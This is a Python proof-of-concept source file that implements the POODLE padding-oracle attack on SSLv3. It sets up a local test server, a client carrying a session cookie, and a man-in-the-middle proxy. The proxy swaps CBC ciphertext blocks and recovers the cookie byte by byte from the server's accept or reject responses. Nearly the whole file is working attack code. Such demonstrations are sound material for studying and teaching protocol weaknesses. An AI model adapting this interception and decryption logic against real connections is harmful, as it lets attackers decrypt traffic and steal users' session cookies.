#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
    Poodle implementation with a client <--> proxy <--> server
    Author: mpgn <martial.puygrenier@gmail.com>
'''

import argparse
import random
import re
import select
import socket
import SocketServer
import ssl
import string
import sys
import struct
import threading
import time
from utils.color import draw
from pprint import pprint
from struct import *

class SecureTCPHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_SSLv3)
    #loop to avoid broken pipe
    while True:
        try:
            data = self.request.recv(1024)
            if data == '':
                break
            self.request.send(b'OK')
        except ssl.SSLError as e:
            pass
    return

class Server:
    """The secure server.
    A sample server, serving on his host and port waiting the client 
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        self.httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
        server = threading.Thread(target=self.httpd.serve_forever)
        server.daemon=True
        server.start()
        print('Server is serving HTTPS on {!r} port {}'.format(self.host, self.port))
        return

    def get_host(self):
        return self.host

    def get_port(self):
        return self.port

    def disconnect(self):
        print('Server stop serving HTTPS on {!r} port {}'.format(self.host, self.port))
        self.httpd.shutdown()
        return

class Client:
    """ The unsecure post of the client can be a "unsecure" browser for example.
    The client generate a random cookie and send it to the server through the proxy
    The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
    """

    def __init__(self, host, port):
        self.proxy_host = host
        self.proxy_port = port
        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
        print draw("Sending request : ", bold=True, fg_yellow=True)
        print draw("GET / HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n",  bold=True, fg_yellow=True)

    def connection(self):
        # Initialization of the client
        ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3)
        ssl_sock.connect((self.proxy_host,self.proxy_port))
        ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.socket = ssl_sock
        return
    
    def request(self, path=0, data=0):
        srt_path = ''
        srt_data = ''
        for x in range(0,path):
            srt_path += 'A'
        for x in range(0,data):
            srt_data += 'D'
        try:
            self.socket.sendall(b"GET /"+ srt_path +" HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n" + srt_data)
            msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
        except ssl.SSLError as e:
            pass
        pass
        return

    def disconnect(self):
        self.socket.close()
        return

class ProxyTCPHandler(SocketServer.BaseRequestHandler):
    """ 
    Start a connection to the secure server and handle multiple socket connections between the client and the server
    Informe the attacker about the client's frames or the server's response
    Finally redirect the data from the client to the server and inversely
    """
    def handle(self):

        # Connection to the secure server
        socket_server = socket.create_connection((server.get_host(), server.get_port()))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        data_altered = False
        length_header = 24
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:

                    data = socket_server.recv(1024)
                    if len(data) == 0:
                        running = False
                        break

                    if data_altered is True:
                        (content_type, version, length) = struct.unpack('>BHH', data[0:5])
                        if content_type == 23:
                            poodle.set_decipherable(True)
                        data_altered = False
                    # we send data to the client
                    self.request.send(data)

                elif source is self.request:
                    
                    ssl_header = self.request.recv(5)
                    if ssl_header == '':
                        running = False
                        break

                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)

                    data = self.request.recv(length)
                    if len(data) == 0:
                        running = False

                    if length == 32:
                        length_header = 32

                    if content_type == 23 and length > length_header:
                        poodle.set_length_frame(data)
                        data = poodle.alter()  
                        data_altered = True  
                    
                    # we send data to the server
                    socket_server.send(ssl_header+data)
        return

class Proxy:
    """ Assimilate to a MitmProxy
    start a serving on his host and port and redirect the data to the server due to this handler
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        httpd = SocketServer.TCPServer((self.host, self.port), ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon=True
        proxy.start()
        print('Proxy is launched on {!r} port {}'.format(self.host, self.port))
        self.proxy = httpd
        return

    def disconnect(self):
        print('Proxy is stopped on {!r} port {}'.format(self.host, self.port))
        self.proxy.shutdown()
        return

class Poodle(Client):
    """ Assimilate to the attacker
    detect the length of a CBC block
    alter the ethernet frame of the client to decipher a byte regarding the proxy informations
    """

    def __init__(self, client):
        self.client = client
        self.length_block = 0
        self.start_exploit = False
        self.decipherable = False
        self.request = ''
        self.byte_decipher = 0

    def run(self):
        self.client_connection()
        self.size_of_block()
        self.start_exploit = True
        # disconnect the client to avoid "connection reset by peer"
        self.client_disconect()
        print "Start decrypting the request..."
        self.exploit()
        print '\n'
        print draw("%r" %(self.request), bold=True, fg_yellow=True)
        print '\n'
        self.client_disconect()
        return

    def exploit(self):
        # start at block 1, finish at block n-2
        # 0 => IV unknow, n => padding block, n-1 => MAC block
        length_f = self.length_frame
        for i in range(1,(length_f/self.length_block) - 1):
            self.current_block = i
            for j in range(self.length_block-1, -1, -1):
                (plain, nb_request) = self.find_plaintext_byte(self.frame,j)
                self.request += plain
                percent = 100.0 * self.byte_decipher / (length_f - 2 * self.length_block)
                sys.stdout.write("\rProgression %2.0f%% - client's request %4s - byte found: %r" % (percent, nb_request, plain))
                sys.stdout.flush()
        return

    def choosing_block(self, current_block):
        return self.frame[current_block * self.length_block:(current_block + 1) * self.length_block]

    def find_plaintext_byte(self, frame, byte):
        nb_request = 0
        plain = ""
        print ''
        while True:
            self.client_connection()
            prefix_length = byte
            suffix_length = self.length_block - byte           
            
            self.send_request_from_the_client(self.length_block+self.nb_prefix+prefix_length, suffix_length)
            # sleep to avoid "connection reset by peer" on macintosh
            time.sleep(0.0001)
            self.client_disconect()          
            if self.decipherable is True:
                self.byte_decipher += 1
                plain = self.decipher(self.frame)
                self.decipherable = False
                break
            nb_request += 1
            sys.stdout.write("\rclient's request %4s" % (nb_request))
            sys.stdout.flush()
        return (chr(plain), nb_request)

    def size_of_block(self):
        print "Begins searching the size of a block...\n"
        self.send_request_from_the_client()
        reference_length = self.length_frame
        i = 0
        while True:
            self.send_request_from_the_client(i)
            current_length = self.length_frame
            self.length_block = current_length - reference_length
            if self.length_block != 0:
                self.nb_prefix = i
                print draw("CBC block size " + str(self.length_block) + "\n", bold=True)
                break
            i += 1
        self.decipherable = False

    def decipher(self, data):
        return self.choosing_block(self.current_block-1)[-1] ^ self.choosing_block(-2)[-1] ^ (self.length_block-1)

    def alter(self):
        if self.start_exploit is True:
            self.frame = bytearray(self.frame)
            self.frame = self.frame[:-self.length_block] + self.choosing_block(self.current_block)
            return str(self.frame)
        return self.frame

    def set_decipherable(self, status):
        self.decipherable = status
        return

    def set_length_frame(self, data):
        self.frame = data
        self.length_frame = len(data)

    def client_connection(self):
        self.client.connection()
        return

    def send_request_from_the_client(self, path=0, data=0):
        self.client.request(path,data)
        return

    def client_disconect(self):
        self.client.disconnect()
        return

if __name__ == '__main__':

    plan = """\

    +-----------------+         +------------+          +-----------+
    |                 +-------> |            +--------> |           |
    |     Client      |         |    Proxy   |          |   Server  |
    |                 | <-------+            | <--------+           |
    +-----------------+         +---+---+----+          +-----------+
                                    |   |                                          
                 ^                  |   |                                          
                 |            +-----v---+------+                                   
                 |            |                |                                   
                 --+----------+     Attacker   |                                   
        inject javascript     |                |                                   
                              +----------------+ 
    """                              

    parser = argparse.ArgumentParser(description='Connection with SSLv3')
    parser.add_argument('host', help='hostname or IP address')
    parser.add_argument('port', type=int, help='TCP port number')
    parser.add_argument('-v', help='debug mode', action="store_true")
    args = parser.parse_args()

    print plan + "\n"

    server  = Server(args.host, args.port)
    client  = Client(args.host, args.port+1)
    spy     = Proxy(args.host, args.port+1)
    poodle  = Poodle(client)

    server.connection()
    spy.connection()

    poodle.run()

    spy.disconnect()
    server.disconnect()
